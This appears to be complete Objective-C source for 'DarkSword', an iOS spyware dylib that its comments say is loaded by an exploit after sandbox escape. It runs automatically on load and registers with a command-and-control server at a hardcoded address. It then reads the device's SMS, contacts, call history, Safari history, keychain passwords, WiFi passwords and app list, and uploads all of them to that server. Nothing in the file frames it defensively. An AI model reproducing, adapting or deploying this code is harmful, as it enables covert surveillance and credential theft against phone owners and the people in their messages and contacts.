/**
 * DarkSword iOS Data Collection Agent
 * Zero-touch dylib payload loaded by Coruna exploit
 * Reads system databases and sends to C2 server
 */

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sqlite3.h>
#import <Security/Security.h>

// C2 Configuration
#define C2_BASE_URL "http://192.168.110.111:8081"
#define DEVICE_ID 0  // Will be set dynamically

// Forward declarations
void collect_sms(int device_id);
void collect_contacts(int device_id);
void collect_call_history(int device_id);
void collect_safari_history(int device_id);
void collect_keychain(int device_id);
void collect_wifi(int device_id);
void collect_installed_apps(int device_id);
void send_to_c2(NSString *reportType, NSDictionary *data, int device_id);
void send_file_to_c2(NSString *fileName, NSData *fileData, NSString *fileType, int device_id);

// SQLite helper
NSMutableArray *query_sqlite(const char *db_path, const char *sql) {
    NSMutableArray *results = [NSMutableArray array];
    sqlite3 *db;
    if (sqlite3_open(db_path, &db) != SQLITE_OK) {
        NSLog(@"[DarkSword] Cannot open database: %s", db_path);
        return results;
    }
    
    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        NSLog(@"[DarkSword] SQL error: %s", sqlite3_errmsg(db));
        sqlite3_close(db);
        return results;
    }
    
    int col_count = sqlite3_column_count(stmt);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        for (int i = 0; i < col_count; i++) {
            const char *col_name = sqlite3_column_name(stmt, i);
            int col_type = sqlite3_column_type(stmt, i);
            
            NSString *key = [NSString stringWithUTF8String:col_name];
            id value = nil;
            
            switch (col_type) {
                case SQLITE_INTEGER:
                    value = @(sqlite3_column_int64(stmt, i));
                    break;
                case SQLITE_FLOAT:
                    value = @(sqlite3_column_double(stmt, i));
                    break;
                case SQLITE_TEXT:
                    value = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(stmt, i)];
                    break;
                case SQLITE_BLOB:
                    value = [[NSData dataWithBytes:sqlite3_column_blob(stmt, i) 
                                            length:sqlite3_column_bytes(stmt, i)] base64EncodedStringWithOptions:0];
                    break;
                case SQLITE_NULL:
                    value = [NSNull null];
                    break;
            }
            if (value) row[key] = value;
        }
        [results addObject:row];
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return results;
}

// HTTP POST to C2
void send_to_c2(NSString *reportType, NSDictionary *data, int device_id) {
    NSString *urlStr = [NSString stringWithFormat:@"%s/api/v1/c2/report", C2_BASE_URL];
    NSURL *url = [NSURL URLWithString:urlStr];
    
    NSMutableDictionary *body = [NSMutableDictionary dictionary];
    body[@"deviceId"] = @(device_id);
    body[@"reportType"] = reportType;
    body[@"data"] = data;
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&error];
    if (error) {
        NSLog(@"[DarkSword] JSON error: %@", error);
        return;
    }
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    request.HTTPBody = jsonData;
    
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request 
                                            completionHandler:^(NSData *resp, NSURLResponse *response, NSError *err) {
        if (err) {
            NSLog(@"[DarkSword] C2 error: %@", err);
        } else {
            NSLog(@"[DarkSword] C2 response: %ld", (long)[(NSHTTPURLResponse *)response statusCode]);
        }
    }];
    [task resume];
}

// Upload file to C2
void send_file_to_c2(NSString *fileName, NSData *fileData, NSString *fileType, int device_id) {
    NSString *urlStr = [NSString stringWithFormat:@"%s/api/v1/upload", C2_BASE_URL];
    NSURL *url = [NSURL URLWithString:urlStr];
    
    NSMutableDictionary *body = [NSMutableDictionary dictionary];
    body[@"deviceId"] = @(device_id);
    body[@"fileName"] = fileName;
    body[@"fileData"] = [fileData base64EncodedStringWithOptions:0];
    body[@"fileType"] = fileType;
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&error];
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    request.HTTPBody = jsonData;
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request 
                                                                completionHandler:^(NSData *resp, NSURLResponse *response, NSError *err) {
        if (err) NSLog(@"[DarkSword] Upload error: %@", err);
        else NSLog(@"[DarkSword] Upload response: %ld", (long)[(NSHTTPURLResponse *)response statusCode]);
    }];
    [task resume];
}

// === SMS Collection ===
void collect_sms(int device_id) {
    NSLog(@"[DarkSword] Collecting SMS...");
    const char *db_path = "/var/mobile/Library/SMS/sms.db";
    
    // Upload raw database
    NSData *dbData = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:db_path]];
    if (dbData) {
        send_file_to_c2(@"sms.db", dbData, @"database", device_id);
    }
    
    // Query messages
    NSMutableArray *messages = query_sqlite(db_path, 
        "SELECT m.text, m.date, m.is_from_me, m.service, h.id as handle "
        "FROM message m LEFT JOIN handle h ON m.handle_id = h.ROWID "
        "ORDER BY m.date DESC LIMIT 500");
    
    for (NSDictionary *msg in messages) {
        send_to_c2(@"SOCIAL_ACCOUNT", @{
            @"platform": @"SMS",
            @"username": msg[@"handle"] ?: @"unknown",
            @"token": msg[@"text"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"date:%@,from_me:%@", msg[@"date"], msg[@"is_from_me"]]
        }, device_id);
    }
    NSLog(@"[DarkSword] SMS: %lu messages", (unsigned long)messages.count);
}

// === Contacts Collection ===
void collect_contacts(int device_id) {
    NSLog(@"[DarkSword] Collecting Contacts...");
    const char *db_path = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    
    NSData *dbData = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:db_path]];
    if (dbData) {
        send_file_to_c2(@"AddressBook.sqlitedb", dbData, @"database", device_id);
    }
    
    NSMutableArray *contacts = query_sqlite(db_path,
        "SELECT p.first, p.last, p.Organization, v.value as phone "
        "FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID = v.record_id "
        "WHERE v.property = 3 LIMIT 500");
    
    for (NSDictionary *c in contacts) {
        NSString *name = [NSString stringWithFormat:@"%@ %@", 
                         c[@"first"] ?: @"", c[@"last"] ?: @""];
        send_to_c2(@"SOCIAL_ACCOUNT", @{
            @"platform": @"Contacts",
            @"username": [name stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]],
            @"token": c[@"phone"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"org:%@", c[@"Organization"] ?: @""]
        }, device_id);
    }
    NSLog(@"[DarkSword] Contacts: %lu", (unsigned long)contacts.count);
}

// === Call History Collection ===
void collect_call_history(int device_id) {
    NSLog(@"[DarkSword] Collecting Call History...");
    const char *db_path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
    
    NSData *dbData = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:db_path]];
    if (dbData) {
        send_file_to_c2(@"CallHistory.storedata", dbData, @"database", device_id);
    }
    
    NSMutableArray *calls = query_sqlite(db_path,
        "SELECT ZADDRESS as address, ZDATE as date, ZDURATION as duration, "
        "ZCALLTYPE as call_type, ZORIGINATED as originated "
        "FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 200");
    
    for (NSDictionary *call in calls) {
        send_to_c2(@"SOCIAL_ACCOUNT", @{
            @"platform": @"CallHistory",
            @"username": call[@"address"] ?: @"unknown",
            @"token": [NSString stringWithFormat:@"duration:%@", call[@"duration"]],
            @"cachedData": [NSString stringWithFormat:@"date:%@,type:%@,originated:%@", 
                          call[@"date"], call[@"call_type"], call[@"originated"]]
        }, device_id);
    }
    NSLog(@"[DarkSword] Calls: %lu", (unsigned long)calls.count);
}

// === Safari History Collection ===
void collect_safari_history(int device_id) {
    NSLog(@"[DarkSword] Collecting Safari History...");
    const char *db_path = "/var/mobile/Library/Safari/History.db";
    
    NSData *dbData = [NSData dataWithContentsOfFile:[NSString stringWithUTF8String:db_path]];
    if (dbData) {
        send_file_to_c2(@"History.db", dbData, @"database", device_id);
    }
    
    NSMutableArray *history = query_sqlite(db_path,
        "SELECT url, title, visit_time FROM history_items ORDER BY visit_time DESC LIMIT 200");
    
    for (NSDictionary *item in history) {
        send_to_c2(@"SOCIAL_ACCOUNT", @{
            @"platform": @"Safari",
            @"username": item[@"url"] ?: @"",
            @"token": item[@"title"] ?: @"",
            @"cachedData": [NSString stringWithFormat:@"visit_time:%@", item[@"visit_time"]]
        }, device_id);
    }
    NSLog(@"[DarkSword] Safari: %lu", (unsigned long)history.count);
}

// === Keychain Collection ===
void collect_keychain(int device_id) {
    NSLog(@"[DarkSword] Collecting Keychain...");
    
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData: @YES,
        (__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
    };
    
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    
    if (status == errSecSuccess && result) {
        NSArray *items = (__bridge NSArray *)result;
        for (NSDictionary *item in items) {
            NSString *service = item[(__bridge id)kSecAttrService] ?: @"";
            NSString *account = item[(__bridge id)kSecAttrAccount] ?: @"";
            NSData *data = item[(__bridge id)kSecValueData];
            NSString *password = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
            
            if (service.length > 0 || account.length > 0) {
                send_to_c2(@"SOCIAL_ACCOUNT", @{
                    @"platform": @"KEYCHAIN",
                    @"username": account,
                    @"token": password ?: @"",
                    @"cachedData": [NSString stringWithFormat:@"service:%@", service]
                }, device_id);
            }
        }
        NSLog(@"[DarkSword] Keychain: %lu items", (unsigned long)items.count);
        CFRelease(result);
    }
}

// === WiFi Collection ===
void collect_wifi(int device_id) {
    NSLog(@"[DarkSword] Collecting WiFi...");
    
    // Try to read known networks plist
    NSString *wifiPath = @"/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
    NSDictionary *wifiDict = [NSDictionary dictionaryWithContentsOfFile:wifiPath];
    
    if (wifiDict) {
        for (NSString *ssid in wifiDict.allKeys) {
            NSDictionary *network = wifiDict[ssid];
            NSString *password = network[@"Password"] ?: network[@"password"] ?: @"";
            send_to_c2(@"WIFI_PASSWORD", @{
                @"ssid": ssid,
                @"password": password,
                @"securityType": network[@"SecurityType"] ?: @"unknown",
                @"bssid": network[@"BSSID"] ?: @""
            }, device_id);
        }
        NSLog(@"[DarkSword] WiFi: %lu networks", (unsigned long)wifiDict.count);
    }
}

// === Installed Apps Collection ===
void collect_installed_apps(int device_id) {
    NSLog(@"[DarkSword] Collecting Installed Apps...");
    
    NSString *appPath = @"/var/mobile/Library/Caches/com.apple.mobile.installation.plist";
    NSDictionary *appDict = [NSDictionary dictionaryWithContentsOfFile:appPath];
    
    if (appDict) {
        NSMutableArray *apps = [NSMutableArray array];
        NSDictionary *userApps = appDict[@"User"];
        if (userApps) {
            for (NSString *bundleId in userApps.allKeys) {
                [apps addObject:bundleId];
            }
        }
        NSDictionary *systemApps = appDict[@"System"];
        if (systemApps) {
            for (NSString *bundleId in systemApps.allKeys) {
                [apps addObject:bundleId];
            }
        }
        
        send_to_c2(@"SOCIAL_ACCOUNT", @{
            @"platform": @"InstalledApps",
            @"username": [NSString stringWithFormat:@"%lu apps", (unsigned long)apps.count],
            @"cachedData": [apps componentsJoinedByString:@","]
        }, device_id);
        NSLog(@"[DarkSword] Apps: %lu", (unsigned long)apps.count);
    }
}

// === Data Collection Function ===
void darksword_agent_collect(void) {
    NSLog(@"[DarkSword] Starting data collection...");
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // Get device ID from C2 (register first)
        NSString *urlStr = [NSString stringWithFormat:@"%s/api/v1/devices/register", C2_BASE_URL];
        NSURL *url = [NSURL URLWithString:urlStr];
        
        UIDevice *device = [UIDevice currentDevice];
        NSDictionary *regBody = @{
            @"udid": [NSString stringWithFormat:@"dylib_%@", [[NSUUID UUID] UUIDString]],
            @"deviceName": device.name,
            @"model": device.model,
            @"osVersion": device.systemVersion,
            @"tagId": @"1"
        };
        
        NSError *error;
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:regBody options:0 error:&error];
        
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        request.HTTPMethod = @"POST";
        [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        request.HTTPBody = jsonData;
        
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        __block int device_id = 0;
        
        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request
                                                                    completionHandler:^(NSData *resp, NSURLResponse *response, NSError *err) {
            if (!err && resp) {
                NSDictionary *result = [NSJSONSerialization JSONObjectWithData:resp options:0 error:nil];
                if ([result[@"code"] intValue] == 0) {
                    device_id = [result[@"data"][@"id"] intValue];
                    NSLog(@"[DarkSword] Registered device ID: %d", device_id);
                }
            }
            dispatch_semaphore_signal(sem);
        }];
        [task resume];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        
        if (device_id == 0) {
            NSLog(@"[DarkSword] Registration failed, using default ID");
            device_id = 1;
        }
        
        // Collect all data
        collect_sms(device_id);
        collect_contacts(device_id);
        collect_call_history(device_id);
        collect_safari_history(device_id);
        collect_keychain(device_id);
        collect_wifi(device_id);
        collect_installed_apps(device_id);
        
        NSLog(@"[DarkSword] Collection complete!");
    });
}

// === Main Entry Points ===
// _process is called by Coruna Stage3 after sandbox escape
void _process(void) {
    NSLog(@"[DarkSword] _process called by Coruna Stage3");
    darksword_agent_collect();
}

__attribute__((constructor))
static void darksword_agent_init(void) {
    NSLog(@"[DarkSword] Agent loaded via constructor");
    // Auto-collect when loaded
    darksword_agent_collect();
}
